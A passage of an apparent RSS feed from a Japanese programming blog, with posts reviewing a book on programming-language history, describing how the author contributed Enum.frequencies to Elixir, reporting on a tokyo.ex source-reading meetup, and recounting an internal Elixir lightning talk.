&lt;p class="footnote">&lt;a href="#fn-70f30c2f" name="f-70f30c2f" class="footnote-number">*1&lt;/a>&lt;span class="footnote-delimiter">:&lt;/span>&lt;span class="footnote-text">Punditではリソースに対しての制約をpolicyと呼ぶ&lt;/span>&lt;/p>
&lt;p class="footnote">&lt;a href="#fn-21322c3d" name="f-21322c3d" class="footnote-number">*2&lt;/a>&lt;span class="footnote-delimiter">:&lt;/span>&lt;span class="footnote-text">もちろんこのままじゃないですよ！&lt;/span>&lt;/p>
&lt;/div>
&lt;/body></description></item><item><title>「コーディングを支える技術」を読んだ</title><link>https://qwyng.dev/posts/2019/11/02/201231/</link><pubDate>Sat, 02 Nov 2019 20:12:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/11/02/201231/</guid><description>&lt;body>
&lt;p>チームの人が読んでいて面白そうだったので、またElixirの諸々で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC">プログラミング言語&lt;/a>というものに関心があったので読んだ&lt;/p>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/477415654X/hatena-blog-22/">&lt;img src="https://images-fe.ssl-images-amazon.com/images/I/51nXP3TKXVL._SL160_.jpg" class="hatena-asin-detail-image" alt="コーディングを支える技術 ~成り立ちから学ぶプログラミング作法 (WEB+DB PRESS plus)" title="コーディングを支える技術 ~成り立ちから学ぶプログラミング作法 (WEB+DB PRESS plus)">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/477415654X/hatena-blog-22/">コーディングを支える技術 ~成り立ちから学ぶプログラミング作法 (WEB+DB PRESS plus)&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span> 西尾泰和&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">出版社/メーカー:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B5%BB%BD%D1%C9%BE%CF%C0%BC%D2">技術評論社&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2013/04/24&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 単行本（ソフトカバー）&lt;/li>
&lt;li>&lt;a href="http://d.hatena.ne.jp/asin/477415654X/hatena-blog-22" target="_blank">この商品を含むブログ (37件) を見る&lt;/a>&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;h2>感想&lt;/h2>
&lt;p>ifを始めとする制御構文が何故生まれたのかについてgotoから解説してあったり、関数、例外、コンテナ等いつも書いてる&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC">プログラミング言語&lt;/a>には当たり前にある機能が何故あるのかだったり、型、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AA%A5%D6%A5%B8%A5%A7%A5%AF%A5%C8%BB%D8%B8%FE">オブジェクト指向&lt;/a>、並行処理を発端から物語のように書いてある等、単純に読み物として面白い本だった。&lt;br>
配列、連結リストの違いや、辞書におけるハッシュテーブルと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%CC%DA%B9%BD%C2%A4">木構造&lt;/a>は技術的にも知っておきたい認識だと思う。&lt;br>
文字列、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%CA%B8%BB%FA%A5%B3%A1%BC%A5%C9">文字コード&lt;/a>の話ものっていて、文字列がClang以外長さの情報持ってるとか、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Unicode">Unicode&lt;/a>に至るまでの過程とか、当たり前&lt;a href="#f-6f4e3d1e" name="fn-6f4e3d1e" title="僕はUTF-8ってのがいっちゃん強いんだろ？くらいの認識しかなかった。">*1&lt;/a>（であろう）知識を補完できてありがたかった。&lt;br>
読みやすい、書きやすい、とはなんなのか、それを計算機に効率よく処理させるにはどうしたら良いのか、色んな人がその課題に取り組んでいる。&lt;/p>
&lt;h2>どんな人におすすめか&lt;/h2>
&lt;p>何種類か&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC">プログラミング言語&lt;/a>を触ってみたけど周りが言ってる「&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%CA%B8%BB%FA%A5%B3%A1%BC%A5%C9">文字コード&lt;/a>」とか「スレッドセーフ」とか「&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B7%BF%BF%E4%CF%C0">型推論&lt;/a>」とかいまいちついていけないなぁという人におすすめできると思う。&lt;br>
自分が書いてるコードに対して「これってそういう考え、歴史からできていたのか！」というのがふんわりわかってコードを書くのがまた少し楽しくなった。&lt;/p>
&lt;div class="footnote">
&lt;p class="footnote">&lt;a href="#fn-6f4e3d1e" name="f-6f4e3d1e" class="footnote-number">*1&lt;/a>&lt;span class="footnote-delimiter">:&lt;/span>&lt;span class="footnote-text">僕は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/UTF-8">UTF-8&lt;/a>ってのがいっちゃん強いんだろ？くらいの認識しかなかった。&lt;/span>&lt;/p>
&lt;/div>
&lt;/body></description></item><item><title>Elixirにコントリビュートしてみよう！</title><link>https://qwyng.dev/posts/2019/10/20/193614/</link><pubDate>Sun, 20 Oct 2019 19:36:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/10/20/193614/</guid><description>&lt;body>
&lt;p>最近ElixirにPRをだしてマージされました。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Felixir-lang%2Felixir%2Fpull%2F9425" title="add Enum.frequencies and Enum.frequencies_by by QWYNG · Pull Request #9425 · elixir-lang/elixir" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/elixir-lang/elixir/pull/9425">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>Elixir 1.10から&lt;code>Enum.frequencies/1&lt;/code>と&lt;code>Enum.frequencies_by/2&lt;/code>が多分生えます。&lt;/p>
&lt;pre class="code lang-elixir" data-lang="elixir" data-unlink> iex&amp;gt; Enum.frequencies(~w{ant buffalo ant ant buffalo dingo})
%{"ant" =&amp;gt; 3, "buffalo" =&amp;gt; 2, "dingo" =&amp;gt; 1}
iex&amp;gt; Enum.frequencies_by(~w{aaa aA bbb cc c}, &amp;amp;String.length/1)
%{3 =&amp;gt; 2, 2 =&amp;gt; 2, 1 =&amp;gt; 1}
&lt;/pre>
&lt;p>着想は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>のtallyからです。&lt;/p>
&lt;p>Elixirは書いていてとても楽しい言語で,リンターやテスト等周辺のエコシステムも整っていて便利です。&lt;br>
みなさんもぜひElixirの魅力にはまってElixirにコントリビュートしてもらいたいということで記事を書きました。
今回はElixirという言語そのものの仕様ではなく、elixir-lang/elixirへの実際にPRした時の流れを書きたいと思います。
後世のElixirを担うそこのあなたに少しでも役にたてば幸いです。&lt;/p>
&lt;h2>elixir-lang/elixirの特徴&lt;/h2>
&lt;p>コントリビュートするという視点で見てelixir-lang/elixirの一番大きな特徴は実装がElixirで書かれているということです。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>の実装に貢献するには&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/C%B8%C0%B8%EC">C言語&lt;/a>の知識が必要ですがElixirではElixirが書ければElixirが書けます！&lt;/p>
&lt;h2>elixir-lang/elixirに貢献したい！どうすれば？&lt;/h2>
&lt;p>&lt;a href="https://github.com/elixir-lang/elixir#contributing">公式のREADME&lt;/a>を読みましょう。
一番最新で正しい情報がのってます。とはいえそれだとこの記事終わってしまうので自分のやったことの流れを書きます。&lt;/p>
&lt;ol>
&lt;li>forkしてローカルにclone&lt;/li>
&lt;li>Enjoy Cording!&lt;/li>
&lt;li>
&lt;code>make compile&lt;/code>して変更したexファイルを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB">コンパイル&lt;/a>
&lt;/li>
&lt;li>
&lt;code>bin/elixir lib/elixir/test/elixir/変更したファイルのテスト.exs&lt;/code>でテストを実行&lt;/li>
&lt;li>
&lt;code>mix format&lt;/code>でリンターを走らせます&lt;/li>
&lt;li>commit &amp;amp; push!&lt;/li>
&lt;/ol>
&lt;p>1,2,6はどの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>でも当然ですね。
2の作業中に実際にREPLを叩きたい場合は、変更したファイルを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB">コンパイル&lt;/a>して&lt;code>bin/iex&lt;/code>で変更したコードが反映されたiexを起動することができます。&lt;br>
以下のように変更したファイルだけ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB">コンパイル&lt;/a>することもできます。&lt;br>
&lt;code>bin/elixirc lib/elixir/lib/string.ex -o lib/elixir/ebin&lt;/code>&lt;br>
6については、例えば&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/rails">rails&lt;/a>/&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/rails">rails&lt;/a>だと「squashして一つにまとめてね」といった注意点があったりしますがElixirという&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>には&lt;strong>今の所&lt;/strong>ないみたいです。&lt;/p>
&lt;h2>僕はできなかったけどやるべきだったこと&lt;/h2>
&lt;h3>新機能の追加はまずメーリスで提案しよう！&lt;/h3>
&lt;p>いきなり&lt;a href="https://github.com/elixir-lang/elixir#proposing-new-features">README&lt;/a>ちゃんと読め案件なんですが、新機能のPRを出す前に&lt;a href="https://groups.google.com/forum/#!forum/elixir-lang-core">Elixir Core maling list&lt;/a>で提案してなぜ役立つのかをコミュニティに説明しましょう。僕はこれを怠りいきなりPRたてて30分でcloseされました。
今回の自分の提案では「tallyの機能って他の言語であったりする？」「名前をこうするのはどうだろう」と様々な意見が出ていました。コミュニティの熱量も感じられますし&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E1%A1%BC%A5%EA%A5%F3%A5%B0%A5%EA%A5%B9%A5%C8">メーリングリスト&lt;/a>は怖いところではないですよ！&lt;/p>
&lt;h3>ちゃんと議論が収束するまで待ちましょう&lt;/h3>
&lt;p>これが一番の反省点なんですが、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E1%A1%BC%A5%EA%A5%F3%A5%B0%A5%EA%A5%B9%A5%C8">メーリングリスト&lt;/a>に提案を出してすこし肯定意見が出始めたあたりで勇んでPRを再度立ててすぐにcloseされるということがありました。ちゃんと議論の収束やコミッターからの指示を待ちましょう。&lt;/p>
&lt;h3>パフォーマンスを意識したコードを書こう&lt;/h3>
&lt;p>最初に僕が出した実装はこれです。&lt;/p>
&lt;pre class="code lang-elixir" data-lang="elixir" data-unlink> def tally(enumerable, func \\ fn x -&amp;gt; x end) do
group_by(enumerable, func)
|&amp;gt; map(fn {key, val} -&amp;gt; {key, count(val)} end)
|&amp;gt; Map.new()
end
&lt;/pre>
&lt;p>関数名とか可読性は別としてこの実装だとgroup_byを使っているので全ての要素に二回アクセスしていることになります。&lt;br>
PRを出して提案されたコードは以下&lt;/p>
&lt;pre class="code lang-elixir" data-lang="elixir" data-unlink> def frequencies_by(enumerable, key_fun \\ fn x -&amp;gt; x end) when is_function(key_fun) do
Enum.reduce(enumerable, %{}, fn entry, acc -&amp;gt;
key = key_fun.(entry)
Map.update(acc, key, 1, &amp;amp;(&amp;amp;1 + 1))
end)
&lt;/pre>
&lt;p>reduceは折りたたみ演算です。この実装なら各要素へのアクセスは一回ですみます。
全てのプログラミングにおいて当然のことですが、特に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC">プログラミング言語&lt;/a>や大きい&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>ではパフォーマンスが重要だと思います。意識して書くと良いですね。&lt;/p>
&lt;h2>自分一人でPRをつくるわけではない&lt;/h2>
&lt;p>特に既にコミュニティがある&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>に言えますが、PRは自分だけで完成するものではないです。
最終的に自分が出したPRも色々変更されています。 &lt;del>というか最終的な実装は僕が書いたとは言えない&lt;/del>&lt;br>
最初から文句なしマージというのは他のPR見ていてもなかなかないと思います。（&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/typo">typo&lt;/a>修正とかは別）&lt;br>
きちんと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>とコミッターに敬意をはらったPRをだして反応に真摯に対応しましょう。&lt;/p>
&lt;h2>おわりに&lt;/h2>
&lt;p>後半はElixir関係なくなっちゃいましたが、ElixirにPR出すときの簡単な標識にでもなっていれば幸いです。&lt;br>
なんだか偉そうなこと書いたけどメンテナー側の人間ではないのでもしかしたら間違ってるかもしれない。とりあえずROMして雰囲気を掴むのが一番いいと思います。&lt;br>
もしElixirに興味を持たれた方は(日本語版は1.2時点のもので少々情報が古いですが)
&lt;a href="https://www.amazon.co.jp/dp/B01KFCXP04/ref=dp-kindle-redirect?_encoding=UTF8&amp;amp;btkr=1">プログラミングElixir&lt;/a>という本がおすすめです。というか神本なのでぜひ買ってください。他言語からElixirを学ぶ人向けに書かれていて、ライブラリを作るハンズオンや非同期処理や&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">メタプログラミング&lt;/a>等盛りだくさんの内容です。&lt;br>
また今回PRを出すに当たり&lt;a href="https://beam-lang.connpass.com/event/148476/">#tokyoex&lt;/a>で学んだことにとても助けられました。大変勉強になる会なのでみなさんもぜひ足を運んでみてはいかがしょうか。&lt;/p>
&lt;/body></description></item><item><title>tokyo.ex#13 elixir本体ソースコードもくもくリード会に参加してEnum.tally書いてみた</title><link>https://qwyng.dev/posts/2019/09/29/231818/</link><pubDate>Sun, 29 Sep 2019 23:18:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/09/29/231818/</guid><description>&lt;body>
&lt;p>「tokyo.ex #13 elixir本体&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9">ソースコード&lt;/a>もくもくリード会」に参加してきました。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fbeam-lang.connpass.com%2Fevent%2F148476%2F" title="tokyo.ex#13 elixir本体ソースコードもくもくリード会 (2019/09/29 13:00〜)" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://beam-lang.connpass.com/event/148476/">beam-lang.connpass.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>Elixirの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9">ソースコード&lt;/a>を事前にcloneしておいて&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Makefile">Makefile&lt;/a>なんかを見ながらエリクサーの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB">コンパイル&lt;/a>の流れを解説していただきました。&lt;/p>
&lt;p>&lt;iframe id="talk_frame_557781" src="//speakerdeck.com/player/0ebcca3509a340399dbfd59d69415b64" width="710" height="399" style="border:0; padding:0; margin:0; background:transparent;" frameborder="0" allowtransparency="true" allowfullscreen="allowfullscreen" mozallowfullscreen="true" webkitallowfullscreen="true">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://speakerdeck.com/hayabusa333/shang-karajian-rukaxia-karajian-ruka">speakerdeck.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>&lt;iframe id="talk_frame_557776" src="//speakerdeck.com/player/2195440622674e859f8f1cc6c10cd1d5" width="710" height="399" style="border:0; padding:0; margin:0; background:transparent;" frameborder="0" allowtransparency="true" allowfullscreen="allowfullscreen" mozallowfullscreen="true" webkitallowfullscreen="true">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://speakerdeck.com/ohr486/hacking-elixir-how-to">speakerdeck.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Makefile">Makefile&lt;/a> is 何？から解説してくださっている発表もありElixir以前の段階で勉強になりました。&lt;/p>
&lt;p>&lt;/p>
&lt;blockquote class="twitter-tweet" data-lang="HASH(0x55663e97e838)">
&lt;p lang="ja" dir="ltr">ですです。&lt;br>lib/elixir/src/elixir.app.src に、elixir . app を作る前のテンプレートがあって、ごにょごにょされて&lt;br>lib/elixir/ebin/elixir.app に出力されております。&lt;/p>— &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%CF%A5%E4%A5%D6%A5%B5">ハヤブサ&lt;/a>@連勤術士 (@hayabusa333) &lt;a href="https://twitter.com/hayabusa333/status/1178171646827319296?ref_src=twsrc%5Etfw">September 29, 2019&lt;/a>
&lt;/blockquote>
&lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;p>ふんわり理解をつぶやいたら登壇者の@hayabusa333氏に補足してもらえました。ありがとうございます！&lt;/p>
&lt;h3>　&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A4%E2%A4%AF%A4%E2%A4%AF%B2%F1">もくもく会&lt;/a>
&lt;/h3>
&lt;p>実際の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A4%E2%A4%AF%A4%E2%A4%AF%B2%F1">もくもく会&lt;/a>の内容は「Elixirのバージョンを書き換えよう」と「標準モジュールの追加」の2つがありました。&lt;/p>
&lt;h4>Elixirのバージョンを書き換えよう&lt;/h4>
&lt;p>Elixirのversionはroot&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8">ディレクト&lt;/a>リのVERSIONというファイルに記載されているのでこれを書き換えてmakeすればok&lt;/p>
&lt;p>&lt;/p>
&lt;blockquote class="twitter-tweet" data-lang="HASH(0x55eba08e0800)">
&lt;p lang="ja" dir="ltr">やった！Elixirのversionハックできたぞ！！&lt;br>&lt;br> &lt;a href="https://twitter.com/hashtag/tokyoex?src=hash&amp;amp;ref_src=twsrc%5Etfw">#tokyoex&lt;/a> &lt;a href="https://t.co/41VVqUPy9U">pic.twitter.com/41VVqUPy9U&lt;/a>&lt;/p>— とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1178173764900511744?ref_src=twsrc%5Etfw">September 29, 2019&lt;/a>
&lt;/blockquote>
&lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;p>実際にmakeしてみると&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> ~~~~~~
Recompile: src/elixir_aliases
Recompile: src/elixir
Generated elixir.app
==&amp;gt; bootstrap (compile)
Compiled lib/elixir/lib/kernel.ex
Compiled lib/elixir/lib/macro/env.ex
~~~~~~ &lt;/pre>
&lt;p>スライドどおりelixir.appが作成されてbootsrapという関数が実行されているのがわかりますね。&lt;/p>
&lt;h3>標準モジュールの追加&lt;/h3>
&lt;p>標準モジュールの追加ですが、自分はモジュールの追加ではなく組み込みモジュールの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Enum">Enum&lt;/a>に関数を一つ追加しました。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>で新しく実装されたtallyです。&lt;del>単にtallyが好きで書きたかっただけ&lt;/del>&lt;/p>
&lt;p>&lt;/p>
&lt;blockquote class="twitter-tweet" data-lang="HASH(0x56454bdf3198)">
&lt;p lang="ja" dir="ltr">標準ライブラリの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Enum">Enum&lt;/a>に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>のtally生やしてみました&lt;br>&lt;br> &lt;a href="https://twitter.com/hashtag/tokyoex?src=hash&amp;amp;ref_src=twsrc%5Etfw">#tokyoex&lt;/a> &lt;a href="https://t.co/btsXYQv8Ln">pic.twitter.com/btsXYQv8Ln&lt;/a>&lt;/p>— とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1178190837424914432?ref_src=twsrc%5Etfw">September 29, 2019&lt;/a>
&lt;/blockquote>
&lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9">ソースコード&lt;/a>はこんな感じです。&lt;/p>
&lt;pre class="code lang-elixir" data-lang="elixir" data-unlink> def tally(enumerable, func \\ fn x -&amp;gt; x end) do
group_by(enumerable, func)
|&amp;gt; map(fn {key, val} -&amp;gt; {key, count(val)} end)
|&amp;gt; Map.new
end
&lt;/pre>
&lt;p>ちょっと例外までは考えきれてないんですが現状のElixirの知見で書いてみました。&lt;a href="#f-a576ec5e" name="fn-a576ec5e" title="もっといい書き方あるで！という方ぜひ教えてください:pray:">*1&lt;/a>&lt;/p>
&lt;p>せっかくなのでテストもElixir本体に書いてみました。&lt;/p>
&lt;pre class="code lang-elixir" data-lang="elixir" data-unlink> test "tally/2" do
assert Enum.tally(~w{a a a b c c}) == %{"a" =&amp;gt; 3, "b" =&amp;gt; 1, "c" =&amp;gt; 2}
assert Enum.tally(~w{aa aA bb cc}, fn x -&amp;gt; String.downcase(x) end) == %{"aa" =&amp;gt; 2, "bb" =&amp;gt; 1, "cc" =&amp;gt; 1}
end
&lt;/pre>
&lt;p>Elixir本体のテストは&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB">コンパイル&lt;/a>したら直接ファイル指定して実行できます。&lt;a href="#f-7170963a" name="fn-7170963a" title="https://github.com/elixir-lang/elixir#contributing
">*2&lt;/a>&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> &amp;gt; bin/elixir lib/elixir/test/elixir/enum_test.exs
Excluding tags: [windows: true]
......................................................................................................................................................................................................................................................................................................................................................
Finished in 2.0 seconds (1.9s on load, 0.05s on tests)
180 doctests, 162 tests, 0 failures
Randomized with seed 313260
&lt;/pre>
&lt;p>けっこう便利なメソッドだしドキュメントちゃんと書いてElixirにPR出してみようかなとか思ってます。
Elixirがこういうメソッドどう考えてるのかはわかりませんが。&lt;/p>
&lt;h3>Elixirコミュニティについて感じたこと&lt;/h3>
&lt;p>福岡を中心に西日本で盛り上がってるみたいですね。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>も福岡は元気なイメージだし福岡熱い。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>の勉強会にいくとほとんどの方がwebエンジニアという印象ですが、Elixirでは組み込みやゲーム領域のエンジニアの方もいて新鮮でした。ゲームとか組み込みとかとの親和性もElixirの魅力ですね。&lt;/p>
&lt;h3>感想&lt;/h3>
&lt;p>とても楽しい勉強会でした。主催者の方、参加者の方、会場を提供していただいた株式会社&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C9%A5%EA%A5%B3%A5%E0">ドリコム&lt;/a>様ありがとうございました！&lt;/p>
&lt;div class="footnote">
&lt;p class="footnote">&lt;a href="#fn-a576ec5e" name="f-a576ec5e" class="footnote-number">*1&lt;/a>&lt;span class="footnote-delimiter">:&lt;/span>&lt;span class="footnote-text">もっといい書き方あるで！という方ぜひ教えてください:pray:&lt;/span>&lt;/p>
&lt;p class="footnote">&lt;a href="#fn-7170963a" name="f-7170963a" class="footnote-number">*2&lt;/a>&lt;span class="footnote-delimiter">:&lt;/span>&lt;span class="footnote-text">&lt;a href="https://github.com/elixir-lang/elixir#contributing">https://github.com/elixir-lang/elixir#contributing&lt;/a>
&lt;/span>&lt;/p>
&lt;/div>
&lt;/body></description></item><item><title>Elixirについて社内LTで発表したよ</title><link>https://qwyng.dev/posts/2019/09/28/203720/</link><pubDate>Sat, 28 Sep 2019 20:37:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/09/28/203720/</guid><description>&lt;body>
&lt;p>最近Elixirに興味をもってプログラミングElixirという本で勉強してます&lt;br>
社内LTでそのことについて発表してみました
&lt;a href="https://speakerdeck.com/qwyng/elixirtopatanmatuti">https://speakerdeck.com/qwyng/elixirtopatanmatuti&lt;/a>&lt;/p>
&lt;p>再代入の説明に@cedretaber氏のこの記事
&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fqiita.com%2Fcedretaber%2Fitems%2F4a7b3572acaeafe070e2" title="Elixirでも変数の再代入はできないよ - Qiita" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://qiita.com/cedretaber/items/4a7b3572acaeafe070e2">qiita.com&lt;/a>&lt;/cite>
を参考にしたところがあります。&lt;/p>
&lt;p>&lt;iframe id="talk_frame_557704" src="//speakerdeck.com/player/b9c05b7e32a347f0ae7fddfe98196579" width="710" height="399" style="border:0; padding:0; margin:0; background:transparent;" frameborder="0" allowtransparency="true" allowfullscreen="allowfullscreen" mozallowfullscreen="true" webkitallowfullscreen="true">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://speakerdeck.com/qwyng/elixirtopatanmatuti">speakerdeck.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>以下Elixirについて思ったこととか&lt;/p>
&lt;h3>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%BA%C6%B5%A2">再帰&lt;/a>の考え方を学べる&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%BA%C6%B5%A2">再帰&lt;/a>の考え方が学べる言語かと思います。パターンマッチでを使うと引数で処理を分けたりができるのでifを使うことがあまりなさそう&lt;/p>
&lt;h3>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/JSON">JSON&lt;/a>解析が強そう&lt;/h3>
&lt;p>プログラミングElixir読むとわかるのですがパターンマッチが根幹をなしてる言語なので&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/JSON">JSON&lt;/a>の解析がCoolにできます。&lt;/p>
&lt;h3>関数型楽しい&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>だとオブジェクトが主役でメソッドがオブジェクトの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/API">API&lt;/a>ぐらいの考え方だったんですけど、Elixirでは関数が主役でオブジェクトじゃなくて「値」って感じがします。
脳に新たな刺激が入ってくる感じで楽しいです。&lt;br>
破壊的変更がないって読みやすくなりますね。&lt;/p>
&lt;h3>プログラミングElixirが神本&lt;/h3>
&lt;p>これが一番言いたかったことなんですけど&lt;/p>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/4274219151/hatena-blog-22/">&lt;img src="https://images-fe.ssl-images-amazon.com/images/I/518jex9rmIL._SL160_.jpg" class="hatena-asin-detail-image" alt="プログラミングElixir" title="プログラミングElixir">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/4274219151/hatena-blog-22/">プログラミングElixir&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span> Dave Thomas,笹田耕一,鳥井雪&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">出版社/メーカー:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AA%A1%BC%A5%E0%BC%D2">オーム社&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2016/08/19&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 単行本（ソフトカバー）&lt;/li>
&lt;li>&lt;a href="http://d.hatena.ne.jp/asin/4274219151/hatena-blog-22" target="_blank">この商品を含むブログ (3件) を見る&lt;/a>&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
この本すごいです。他の言語からElixirを学ぶためにこの本を読むと「これこれこの難易度感で語って欲しいねん〜」が頻発します。
また、練習問題が散りばめられており、いい感じに手を動かしながら読み進めることができます。(練習問題は答えがのってないので間違ってるかもしれない)
